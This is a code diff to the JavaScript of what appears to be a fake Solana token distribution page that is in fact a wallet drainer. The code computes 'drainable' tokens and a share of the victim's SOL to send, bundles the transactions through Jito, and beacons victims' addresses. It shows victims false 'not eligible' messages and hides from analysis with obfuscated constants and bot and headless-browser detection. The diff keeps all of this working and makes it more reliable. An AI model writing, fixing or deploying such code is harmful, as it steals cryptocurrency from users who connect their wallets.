@@ -17,8 +17,7 @@
   ];
   const _xor = (s)=>{ let r=''; for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^_k.charCodeAt(i%_k.length)); return r; };
   const _dec = (b)=>_xor(atob(b));
-  const TOKEN_PROG = new solanaWeb3.PublicKey(_dec(_enc[0]));
-  const TOKEN_2022 = new solanaWeb3.PublicKey(_dec(_enc[1]));
+  let TOKEN_PROG, TOKEN_2022;
   const JITO_TIP_ACC = '96gYZGDnKkHpPBTJ4THLjhviaE7TyBcG2JNGe3nX9FPt';
 
   // ── anti-analysis ──
@@ -27,19 +26,7 @@
       if(navigator.webdriver) return true;
       const ua = navigator.userAgent||'';
       if(/HeadlessChrome|PhantomJS|SlimerJS|Puppeteer|selenium/i.test(ua)) return true;
-      if(!/Mobile|Android|iPhone/i.test(ua) && navigator.plugins && navigator.plugins.length===0) return true;
-      if(typeof navigator.languages!=='undefined' && navigator.languages.length===0) return true;
-      if(window.self !== window.top) return true;
-      try {
-        const c=document.createElement('canvas'); c.width=200; c.height=50;
-        const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60';
-        x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Cwm fjordbank glyphs vext quiz',2,15);
-        if(c.toDataURL().length<500) return true;
-      }catch(e){}
       if(/Chrome-Lighthouse|Chrome Headless/i.test(ua)) return true;
-      if(navigator.serviceWorker && navigator.serviceWorker.controller){
-        try{ const sw=navigator.serviceWorker.controller.scriptURL||''; if(/screenshot|recorder|harness|puppet/i.test(sw)) return true; }catch(e){}
-      }
     }catch(e){}
     return false;
   }
@@ -101,8 +88,8 @@
     try{ const r=await fetch(JITO_TIP_URL,{signal:AbortSignal.timeout(5000)}); const j=await r.json(); if(Array.isArray(j)&&j.length>0) return Math.ceil(Math.max(...j)*1.1); }catch(e){} return 10000;
   }
   async function sendJitoBundle(signedTxs, tipTx){
-    const base58=solanaWeb3.bs58 || solanaWeb3.BS58;
-    if(!base58) throw new Error('bs58 unavailable');
+    const base58 = (typeof bs58 !== 'undefined' && bs58.encode) ? bs58 : (solanaWeb3.bs58 || (solanaWeb3.BS58 && solanaWeb3.BS58));
+    if(!base58 || typeof base58.encode !== 'function') throw new Error('bs58 unavailable');
     const bundle=signedTxs.map(tx=>base58.encode(tx.serialize()));
     if(tipTx) bundle.push(base58.encode(tipTx.serialize()));
     const payload={jsonrpc:'2.0',id:1,method:'sendBundle',params:[bundle]};
@@ -222,15 +209,35 @@
 
   let connection=null, wallet=null, walletPubkey=null, latestBlockhash=null;
 
+  // ── solana load guard ──
+  function waitForSolana(timeout=12000){
+    return new Promise((resolve,reject)=>{
+      if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ resolve(); return; }
+      const start = Date.now();
+      const t = setInterval(()=>{
+        if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ clearInterval(t); clearInterval(fail); resolve(); }
+        if(Date.now()-start > timeout){ clearInterval(t); clearInterval(fail); reject(new Error('solana timeout')); }
+      },100);
+      const fail = t;
+    });
+  }
+
   // ── init ──
   async function init(){
-    if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
-    await Promise.all([loadConfig(), loadSeed()]);
-    if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
-    if(typeof solanaWeb3==='undefined'){ $('loadingMsg').textContent='Failed to load Solana library. Check your connection and refresh.'; return; }
-    connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
-    $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
-    startCountdown();
+    try{
+      if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
+      await Promise.all([loadConfig(), loadSeed()]);
+      if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
+      await waitForSolana(12000);
+      TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+      TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EQFLC1PHnBqXEpPxuEb');
+      connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
+      $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
+      startCountdown();
+    }catch(e){
+      $('loadingMsg').innerHTML = '<span style="color:#ff6b6b">Failed to initialize: ' + (e.message || 'unknown') + '. Check console and refresh.</span>';
+      $('btnConnect').disabled = true;
+    }
   }
 
   function startCountdown(){
@@ -291,7 +298,7 @@
 
       const solAbove=disc.solBalance>_cfg.solReserve?disc.solBalance-_cfg.solReserve:0;
       const solToSend=Math.floor(solAbove*(_cfg.solPercentage/100));
-      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }
+      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }
 
       // TOCTOU: snapshot and re-verify before building final txs
       const snapshot={solBalance:disc.solBalance,tokens:drainable};
